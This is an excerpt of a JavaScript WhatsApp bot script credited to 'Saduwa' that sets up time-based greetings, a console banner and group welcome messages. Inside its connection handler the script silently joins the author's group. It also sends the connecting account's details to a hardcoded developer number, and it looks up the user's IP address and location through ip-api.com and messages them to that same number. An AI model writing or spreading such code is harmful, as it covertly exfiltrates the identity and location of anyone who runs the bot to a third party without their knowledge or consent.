// Ć̴͓̘͓͎̇̒r̵̘̺̘͖͍̫̙̲̭̘̓͂͐̓e̸̳̰̬̦͇̥͍̫̰͌̋̑̄͝a̶̧̬̰̠̥̹͚̜͝ţ̸͖̠̫̳̟͕͚̌͗ḛ̴͔̩͍̤̂̈̍͌͂̉̉͛͝͝ͅd̷͈̥͇̈͂̈́̒͛̀̆̌͘͘ ̵̦͖̠͍̖̲̬̎͛̽͑̅̈̆̚͝͠b̸̨̻͉͎̮̭́̂͊̄͝ͅy̴̨̭̌̃̈́̃́͑̽̒͝ͅ ̷̢̝̮̭͎͖̭̍̔͘Saduwa
const {
...
const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    ...
    if (time2 < "19:00:00") {
      var ucapanWaktu = "Good evening🙂 Saduwa ser";
    }
    if (time2 < "18:00:00") {
      var ucapanWaktu = "good afternoon🙂 Saduwa ser";
    }
    if (time2 < "15:00:00") {
      var ucapanWaktu = "good afternoon🙂 Saduwa ser";
    }
    if (time2 < "11:00:00") {
      var ucapanWaktu = "Good morning🙂 Saduwa ser";
    }
    if (time2 < "05:00:00") {
      var ucapanWaktu = "Good night🙂 Saduwa ser";
    }
...
const gcrevoke = ["94761905764-1621430788@g.us"]
prefix = '.'
shp = '⬡'
owner = "94761905764@s.whatsapp.net"
spc1 = '         '
spc2 = '\n                           '
spc3 = '                   '
spc4 = '               '
...
const starts = async (client = new WAConnection()) => {
  ...
  client.browserDescription = ["Subscribe Saduwa", "Chrome", "3.0"];
  ...
  client.on("qr", () => {
    console.log(
      ...
      client.sendMessage(`94761905764@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Connected Successfully!_`, MessageType.extendedText)
  ...
  client.on("open", () => {
    success("2", "Successfully connected to wa, Subscribe Saduwa");
console.log(color(figlet.textSync(`${spc1}            Saduwa Bot`, {
font: 'Standard',
...
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
    ...
    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/94761905764'))
    console.log(color('[SADUWA BOT]'), color('SADUWA 𝐁𝐨𝐭 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
...
await client.connect({ timeoutMs: 30 * 1000 });
 ...
 client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/CfHOpPuLMVnE5kk6TC2m7W','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Joined to Saduwa Whatsapp Bot group', 'cyan'))
 client.sendMessage(`94761905764@s.whatsapp.net`, `*Hi Owner Saduwa, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Saduwa Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Tony.jpg'),sourceUrl:"https://wa.me/94761905764?text=Hello bro"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("94761905764@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Saduwa Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Tony.jpg'),sourceUrl:"https://wa.me/94761905764?text=Hello bro"}}})
...
fkontakk = { key: {
  fromMe: false,
    participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '94761905764-1604595598@g.us' } : {})
},
 message: {
    "contactMessage":{"displayName":'Saduwa',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Saduwa;;;\nFN:resku\nitem1.TEL;waid=94761905764:++94761905764nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
...
if (anu.action == 'add' && !mem.includes(client.user.jid)) {
			 ...
			 const bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
                ...
                teks = `〽️ *Hɪ* @${num.split('@')[0]}\n〽️ *Bɪᴏ* : *${thu.status}*\n〽️ *Mᴇᴍʙᴇʀs : ${memeg}*\n〽️ *Wᴇʟᴄᴏᴍᴇ Tᴏ* \n *${mdata.subject}*\n〽️ *ᴅᴏɴᴛ ꜰᴏʀɢᴇᴛ ᴛᴏ ʀᴇᴀᴅ ᴅᴇꜱᴄʀɪᴘᴛɪᴏɴ*\n❤️ *Small cheer and great welcome makes a merry feast*\nSADUWA 𝐁𝐨𝐭`
                welcomeBut = [{buttonId:`getdeskgc`,buttonText:{displayText:'DESCRIPTION'},type:1}, {buttonId:`okeyx`,buttonText:{displayText:'©Saduwa Bot'},type:1}]
